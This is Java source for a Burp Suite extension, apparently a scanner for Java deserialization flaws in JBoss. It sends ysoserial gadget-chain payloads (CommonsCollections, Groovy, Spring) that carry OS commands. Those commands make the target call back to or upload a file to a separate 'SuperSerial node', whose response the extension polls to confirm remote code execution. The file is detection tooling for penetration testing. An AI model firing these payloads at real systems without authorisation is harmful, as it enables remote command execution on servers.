/*
	BurpExtender.java
	
	v0.1 (12/2/2015)
	
	SuperSerial Active Scan check: Conduct active scan check that involves converting base request to POST and replacing message body with Java serialized
	object generated by ysoserial containing an operating system command (from PayloadCommandFactory.java) to be executed on target system (processed in
	JBossSerializedInsertionPoint.java). Command will force target system to (via HTTP) a) access a SuperSerial node, or b) upload a file to a SuperSerial
	node. After submitting payload to target system, the active scanner will attempt to a) read the access entry from the SuperSerial node, or b) download
	the file that was uploaded by the target system. If this is successful, a new "Java Deserialization Vulnerability" (SerializationRCEExploitIssue.java)
	Scan Issue will be created, displaying the request containing the exploit java serialized object.
	
	Currently supports target systems running the JBoss platform only.
*/

package burp;

//standard includes
import java.util.*;
import java.net.URL;
import java.io.*;
import javax.swing.*;
import javax.swing.event.*;
import java.awt.Component;
import java.awt.GridLayout;
import java.awt.Color;
import java.awt.Font;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;
import org.json.*;

import ysoserial.*;

public class BurpExtender implements IBurpExtender,ITab,IScannerCheck,IScannerInsertionPointProvider {
	//IBurpExtender fields
	private IBurpExtenderCallbacks callbacks;
	private IExtensionHelpers helpers;
	
	//ITab fields
	private String caption;
	private JPanel component;
	private JTextField hostField;
	private JTextField portField;
	private JCheckBox protocolField;
	private JTextField tokenField;
	private JButton testConnButton;
	private JLabel statusLabel;
	private JTextField numAttemptsField;
	private JTextField waitTimeField;
	
	//SuperSerial node fields
	private IHttpService nodeHttpService;
	private String nodeHost;
	private int nodePort;
	private boolean nodeHttps;
	private String token;
	private int numFileDownloadTries; //how many attempts should be made to download the uploaded file from the node (default 5)
	private int fileDownloadWaitTime; //number of milliseconds to wait between download attempts (default 500)
	
	//payload fields
	private PayloadCommandFactory pcf;
	
	//constants
	private static final String JBOSS_INSERTION_POINT = "SuperSerial-JBoss";
	private static final String[] payloadTypes = new String[] {"CommonsCollections1","CommonsCollections2","Groovy1","Spring1"};
	private static final int DEFAULT_DOWNLOAD_TRIES = 5;
	private static final int DEFAULT_DOWNLOAD_WAIT_TIME = 1500;
	
	//IBurpExtender methods
	@Override
	public void registerExtenderCallbacks(IBurpExtenderCallbacks mCallbacks) {
		callbacks = mCallbacks;
		helpers = callbacks.getHelpers();
		
		callbacks.setExtensionName("SuperSerial - Active");
		callbacks.registerScannerCheck(this);
		callbacks.registerScannerInsertionPointProvider(this);
		
		pcf = new PayloadCommandFactory();
		
		//default settings initialization
		nodeHost = null;
		nodePort = -1;
		nodeHttps = false;
		nodeHttpService = null;
		token = null;
		numFileDownloadTries = DEFAULT_DOWNLOAD_TRIES;
		fileDownloadWaitTime = DEFAULT_DOWNLOAD_WAIT_TIME;
		
		//set ITab implementation
		caption = "SuperSerial";
		component = new JPanel(new GridLayout(7,2));
		component.add(new JLabel("Node Host:",SwingConstants.RIGHT));
		hostField = new JTextField(nodeHost);
		component.add(hostField);
		component.add(new JLabel("Node Port:",SwingConstants.RIGHT));
		portField = new JTextField(Integer.toString(nodePort));
		component.add(portField);
		component.add(new JLabel("Use HTTPS (not yet supported):",SwingConstants.RIGHT));
		protocolField = new JCheckBox((String) null,nodeHttps);
		protocolField.setEnabled(false);
		component.add(protocolField);
		component.add(new JLabel("Node Token (XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX):",SwingConstants.RIGHT));
		tokenField = new JTextField(token);
		component.add(tokenField);
		testConnButton = new JButton("Test Node Connection");
		testConnButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent ae) {
				
				Thread connTestThread = new Thread(new Runnable() {
					public void run() {
						String host = hostField.getText().trim();
						if(host.isEmpty()) {
							statusLabel.setBackground(Color.RED);
							statusLabel.setForeground(Color.WHITE);
							statusLabel.setText("Invalid node host specified!");
							return;
						}
						nodeHost = host;
						
						int port = -1;
						try {
							port = Integer.parseInt(portField.getText().trim());
							if((port<1) || (port>65535)) { //specified port is out of range
								statusLabel.setBackground(Color.RED);
								statusLabel.setForeground(Color.WHITE);
								statusLabel.setText("Invalid node port specified!");
								return;
							}
						} catch(Exception e) {
							statusLabel.setBackground(Color.RED);
							statusLabel.setForeground(Color.WHITE);
							statusLabel.setText("Invalid node port specified!");
							return;
						}
						nodePort = port;
						
						String t = tokenField.getText().trim();
						if(!t.matches("^[a-zA-Z0-9\\-]*$")) {
							statusLabel.setBackground(Color.RED);
							statusLabel.setForeground(Color.WHITE);
							statusLabel.setText("Invalid token specified!");
							return;
						}
						token = t;
						
						if(createNodeHttpService(hostField.getText().trim(),port,nodeHttps)) {
							statusLabel.setBackground(Color.YELLOW);
							statusLabel.setForeground(Color.BLACK);
							statusLabel.setText("Testing connection...");
							
							byte[] req = getNodeGetRequest("/heartbeat");
							//callbacks.printError(new String(req));
							IHttpRequestResponse heartbeatRR = callbacks.makeHttpRequest(nodeHttpService,req);
							byte[] resp = heartbeatRR.getResponse();
							IResponseInfo respInfo = null;
							if(resp!=null) //checking for a request failure/timeout
								respInfo = helpers.analyzeResponse(resp);
							if((resp!=null) && (respInfo!=null)) {
								if(respInfo.getStatusCode()==200) {
									statusLabel.setBackground(Color.GREEN);
									statusLabel.setForeground(Color.BLACK);
									statusLabel.setText("Connection to http"+(nodeHttps ? "s" : "")+"://"+nodeHost+":"+nodePort+" successful!");
								} else {
									statusLabel.setBackground(Color.RED);
									statusLabel.setForeground(Color.WHITE);
									statusLabel.setText(getNodeAuthErrorMessage(false));
								}
							} else { //connection failure
								statusLabel.setBackground(Color.RED);
								statusLabel.setForeground(Color.WHITE);
								statusLabel.setText(getNodeConnectionErrorMessage(false));
							}
						}
					}
				});
				connTestThread.start();
			}
		});
		component.add(testConnButton);
		statusLabel = new JLabel("Node settings unintialized");
		statusLabel.setHorizontalAlignment(SwingConstants.CENTER);
		statusLabel.setOpaque(true);
		statusLabel.setForeground(Color.WHITE);
		statusLabel.setBackground(Color.RED);
		statusLabel.setFont(new Font(statusLabel.getFont().getFontName(),Font.BOLD,statusLabel.getFont().getSize()));
		component.add(statusLabel);
		component.add(new JLabel("Number of download attempts:",SwingConstants.RIGHT));
		numAttemptsField = new JTextField(Integer.toString(numFileDownloadTries));
		numAttemptsField.getDocument().addDocumentListener(new DocumentListener() {
			public void changedUpdate(DocumentEvent de) {
				changeAttempts();
			}
			public void insertUpdate(DocumentEvent de) {
				changeAttempts();
			}
			public void removeUpdate(DocumentEvent de) {
				changeAttempts();
			}
			public void changeAttempts() {
				try{
					numFileDownloadTries = Integer.parseInt(numAttemptsField.getText());
				} catch(Exception e) {
					callbacks.issueAlert("Invalid download attemps value!");
				}
			}
		});
		component.add(numAttemptsField);
		component.add(new JLabel("Milliseconds to wait between tries (1000 = 1 sec):",SwingConstants.RIGHT));
		waitTimeField = new JTextField(Integer.toString(fileDownloadWaitTime));
		waitTimeField.getDocument().addDocumentListener(new DocumentListener() {
			public void changedUpdate(DocumentEvent de) {
				changeTime();
			}
			public void insertUpdate(DocumentEvent de) {
				changeTime();
			}
			public void removeUpdate(DocumentEvent de) {
				changeTime();
			}
			public void changeTime() {
				try{
					fileDownloadWaitTime = Integer.parseInt(waitTimeField.getText());
				} catch(Exception e) {
					callbacks.issueAlert("Invalid wait time value!");
				}
			}
		});
		component.add(waitTimeField);
		callbacks.customizeUiComponent(component);
		callbacks.addSuiteTab(this);
		
		callbacks.issueAlert("Node settings uninitialized, set in "+caption+" tab and click \"Test Connection\"");
	}
	
	
	//ITab methods
	@Override
	public String getTabCaption() {
		return caption;
	}
	
	@Override
	public Component getUiComponent() {
		return component;
	}
	
	
	//IScannerCheck methods
	@Override //likely will not implement this method (passive check is handled by superserial-passive plugin)
	public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
		return null;
	}
	
	@Override
	public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse,IScannerInsertionPoint insertionPoint) {
		List<IScanIssue> issues = null;
		
		if(insertionPoint.getInsertionPointName().equals(JBOSS_INSERTION_POINT)) { //insertion point is SuperSerial custom insertion point
			if(nodeHttpService==null) { //node settings invalid
				callbacks.issueAlert("Invalid SuperSerial node settings! Active scan checks will be skipped! Set settings in "+caption+" tab and click \"Test Connection\"!");
				return issues;
			}
			
			//request #1: create node context
			byte[] req = getNodeGetRequest("/queue");
			//callbacks.printError(new String(req));
			IHttpRequestResponse queueRR = callbacks.makeHttpRequest(nodeHttpService,req);
			byte[] resp = queueRR.getResponse();
			IResponseInfo respInfo = null;
			if(resp!=null) {
				respInfo = helpers.analyzeResponse(resp);
			} else { //connection to node failed (error/timeout)
				callbacks.issueAlert(getNodeConnectionErrorMessage(true));
				statusLabel.setBackground(Color.RED);
				statusLabel.setForeground(Color.WHITE);
				statusLabel.setText(getNodeConnectionErrorMessage(true));
				return issues;
			}
			if(respInfo!=null && respInfo.getStatusCode()==200) { //queue request completed successfully
				//callbacks.printError(new String(resp));
				
				//copy response data to string
				int dataStart = respInfo.getBodyOffset();
				byte[] dataArray = new byte[resp.length-dataStart];
				int i=dataStart;
				int j=0;
				while(i<resp.length) {
					dataArray[j] = resp[i];
					i++;
					j++;
				}
				String data = new String(dataArray);
				
				//parse response JSON
				JSONObject jsonObj = new JSONObject(data);
				String nodePath = (String) jsonObj.get("path");
				
				if(nodePath==null) { //will likely never happen, but just in case
					callbacks.issueAlert("Invalid SuperSerial node settings! Active scan checks will be skipped! Set settings in "+caption+" tab and click \"Test Connection\"!");
					return issues;
				}
				
				Hashtable[] commands = pcf.getCommandsArray();
				
				boolean nodeConnError = false; //whether a connection error/timeout occurred during scanning
				for(i=0;!nodeConnError && i<payloadTypes.length;i++) { //loop through payload types
					
					for(j=0;!nodeConnError && j<commands.length;j++) { //loop through commands, stop if node access/file upload is detected
					
						Hashtable cmdHT = commands[j];
						String cmd = (String) cmdHT.get("cmd");
						//callbacks.printError("Type: "+payloadTypes[i]+"; j="+Integer.toString(j)+"; cmd: "+cmd);
						
						cmd = makeCommand(cmd,nodePath,token);
						//callbacks.printError(payloadTypes[i]+": "+cmd);
						
						//Request #2: create payload using current technique, and send to target host
						String technique = payloadTypes[i];
						
						req = insertionPoint.buildRequest(GeneratePayload.getPayload(technique,cmd));
						//callbacks.printError(new String(req));
						IHttpRequestResponse exploitRR = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),req);
						
						//create highlights for exploit payload request (but do not apply until later if vuln confirmed)
						int cmdStart = helpers.indexOf(req,cmd.getBytes(),true,0,req.length);
						int[] expReqHighlights = new int[] {cmdStart,cmdStart+cmd.length()};
						//callbacks.printError(new String(exploitRR.getResponse()));
						
						//request #3: loop to retrieve uploaded file or access entry
						IHttpRequestResponse fileRR = null;
						int tryCount=0;
						boolean downloaded = false; //if file was successfully downloaded from node
						while(!downloaded && tryCount<numFileDownloadTries) {
							try {
								Thread.sleep(fileDownloadWaitTime);
							} catch(Exception e) {
								//don't care, wait will be skipped this time
							}
							req = getNodeGetRequest(nodePath);
							//callbacks.printError(new String(req));
							fileRR = callbacks.makeHttpRequest(nodeHttpService,req);
							resp = fileRR.getResponse();
							//callbacks.printError(new String(resp));
							respInfo = null;
							if(resp!=null)
								respInfo = helpers.analyzeResponse(resp); 
							if(resp!=null && respInfo!=null) {
								if(respInfo.getStatusCode()==200) {
									downloaded = true;
									break;
								}
							} else { //error making request to node (timeout or failure)
								callbacks.issueAlert(getNodeConnectionErrorMessage(true));
								statusLabel.setBackground(Color.RED);
								statusLabel.setForeground(Color.WHITE);
								statusLabel.setText(getNodeConnectionErrorMessage(true));
								nodeConnError = true;
								break;
							}
							tryCount++;
						}
						
						if(downloaded) { //data was downloaded from node, check if data is expected
							issues = new ArrayList<IScanIssue>(1);
							
							boolean expected = Boolean.parseBoolean((String) cmdHT.get("upload")); //whether uploaded file (true) or access entry (false) is expected
							boolean uploaded = false; //whether data read from node is uploaded file (true) or access entry (false)
							
							//determine whether data read is uploaded file or access entry by reading response headers
							List<String> respHeaders = respInfo.getHeaders();
							Iterator<String> headersItr = respHeaders.iterator();
							String source = null;
							String time = null;
							while(headersItr.hasNext()) {
								String header = headersItr.next();
								String[] headerSplit = null;
								if(header.contains("Upload-")) { //if response contains Upload-Source and Upload-Time headers, uploaded file was downloaded
									headerSplit = header.split(":",2);
									if(source==null & headerSplit[0].equalsIgnoreCase("Upload-Source") && headerSplit.length>1) {
										source = headerSplit[1].trim();
										uploaded = true;
									} else if(time==null && headerSplit[0].equalsIgnoreCase("Upload-Time") && headerSplit.length>1) {
										time = headerSplit[1].trim();
										uploaded = true;
									}
								} else if(header.contains("Content-")) { //if response contains "Content-Type: application/json" header, access entry was downloaded
									headerSplit = header.split(":",2);
									if(headerSplit[0].equalsIgnoreCase("Content-Type") && headerSplit.length>1) {
										headerSplit[1] = headerSplit[1].trim();
										if(headerSplit[1].equalsIgnoreCase("application/json")) {
											uploaded = false;
										}
									}
								}
							}
							
							if(expected==uploaded) { //if data downloaded was as expected: vuln confirmed, report vuln
								//create exploit request highlight indices
								ArrayList<int[]> expReqHighlightsList = new ArrayList<int[]>(1);
								expReqHighlightsList.add(expReqHighlights);
								
								//if data is access entry, parse JSON
								if(!uploaded) {
									dataStart = respInfo.getBodyOffset();
									dataArray = new byte[resp.length-dataStart];
									int k=dataStart;
									int l=0;
									while(k<resp.length) {
										dataArray[l] = resp[k];
										k++;
										l++;
									}
									jsonObj = new JSONObject(new String(dataArray));
									source = (String) jsonObj.get("accessSource");
									time = (String) jsonObj.get("accessTime");
								}
								
								//create node response highlight indices
								ArrayList<int[]> nodeRespHighlightsList = new ArrayList<int[]>(3);
								int srcStart = helpers.indexOf(resp,source.getBytes(),true,0,resp.length);
								int timeStart = helpers.indexOf(resp,time.getBytes(),true,0,resp.length);
								if(srcStart<timeStart) { //source header comes first
									nodeRespHighlightsList.add(new int[] {srcStart,srcStart+source.length()});
									nodeRespHighlightsList.add(new int[] {timeStart,timeStart+time.length()});
								} else {
									nodeRespHighlightsList.add(new int[] {timeStart,timeStart+time.length()});
									nodeRespHighlightsList.add(new int[] {srcStart,srcStart+source.length()});
								}
								if(uploaded) { //if data is uploaded file, highlight file
									nodeRespHighlightsList.add(new int[] {respInfo.getBodyOffset(),resp.length});
								}
								
								//create highlighted request/response and create issue
								IHttpRequestResponseWithMarkers exploitRRWM = callbacks.applyMarkers(exploitRR,expReqHighlightsList,null);
								IHttpRequestResponseWithMarkers fileRRWM = callbacks.applyMarkers(fileRR,null,nodeRespHighlightsList);
								SerializationRCEExploitIssue issue = new SerializationRCEExploitIssue(exploitRRWM,fileRRWM,helpers.analyzeRequest(exploitRR).getUrl(),technique,cmd,source,time,(String) cmdHT.get("os"),expected);
								issues.add(issue);
								return issues;
							}
						}
					}
				}
			} else { //queue request failed (wrong token)
				callbacks.issueAlert(getNodeAuthErrorMessage(true));
				statusLabel.setBackground(Color.RED);
				statusLabel.setForeground(Color.WHITE);
				statusLabel.setText(getNodeAuthErrorMessage(true));
			}
		}
		return issues;
	}
	
	//for now, do not report any new issues, only existing issue
	@Override
	public int consolidateDuplicateIssues(IScanIssue existingIssue,IScanIssue newIssue) {
		return -1;
	}
	
	
	//IScannerInsertionPointProvider methods
	@Override
	public List<IScannerInsertionPoint> getInsertionPoints(IHttpRequestResponse baseRequestResponse) {
		List<IScannerInsertionPoint> ipl = new ArrayList<IScannerInsertionPoint>(1);
		ipl.add(new JBossSerializedInsertionPoint(helpers,baseRequestResponse));
		return ipl;
	}
	
	
	//custom helper methods
	
	//create new httpservice to be used for requests to node
	//false: failure creating new httpservice
	//true: success creating new httpservice (or identical httpservice already created)
	private boolean createNodeHttpService(String host,int port,boolean protocol) {
		if((host==null) || ((port<1) || (port>65535))) { //node settings not yet set or set incorrectly
			callbacks.issueAlert("Attempt to set SuperSerial node settings failed: Invalid settings! (host: (null), port: "+Integer.toString(port));
			return false;
		} else if(host.isEmpty() || ((port<1) || (port>65535))) { //node settings not set correctly
			callbacks.issueAlert("Attempt to set SuperSerial node settings failed: Invalid settings! (host: "+host+", port: "+Integer.toString(port));
			return false;
		}
		
		if(nodeHttpService!=null) { //node service was already set, compare to new settings and set if different
			if(host.equalsIgnoreCase(nodeHttpService.getHost()) && (port==nodeHttpService.getPort())) { //new settings are same as current settings (not yet checking HTTP/HTTPS)
				return true;
			} else {
				nodeHost = host;
				nodePort = port;
				nodeHttps = protocol;
				nodeHttpService = helpers.buildHttpService(nodeHost,nodePort,nodeHttps);
			}
		} else { //node service not yet set, set using inputted settings
			nodeHost = host;
			nodePort = port;
			nodeHttps = protocol;
			nodeHttpService = helpers.buildHttpService(nodeHost,nodePort,nodeHttps);
		}
		return true;
	}
	
	private byte[] getNodeGetRequest(String nodePath) {
		if(nodePath.charAt(0)!='/') nodePath = "/"+nodePath;
		String request = "GET "+nodePath+"?token="+token+" HTTP/1.1\r\nHost: "+nodeHost+":"+Integer.toString(nodePort)+"\r\n\r\n";
		return request.getBytes();
	}
	
	private String getNodeConnectionErrorMessage(boolean scan) {
		return "Connection to http"+(nodeHttps ? "s" : "")+"://"+nodeHost+":"+nodePort+" failed"+(scan ? " during scanning" : "")+"!!! (connection error/timeout)";
	}
	
	private String getNodeAuthErrorMessage(boolean scan) {
		return "Connection to http"+(nodeHttps ? "s" : "")+"://"+nodeHost+":"+nodePort+" failed"+(scan ? " during scanning" : "")+"!!! (wrong token)";
	}
	
	//replace command stock values with correct values
	private String makeCommand(String cmd,String path,String token) {
		cmd = cmd.replace("[NODEPROTOCOL]",(nodeHttps ? "https" : "http"));
		cmd = cmd.replace("[NODEHOST]",nodeHost);
		cmd = cmd.replace("[NODEPORT]",Integer.toString(nodePort));
		cmd = cmd.replace("[NODEPATH]",path); 
		cmd = cmd.replace("[NODETOKEN]",token);
		return cmd;
	}
}
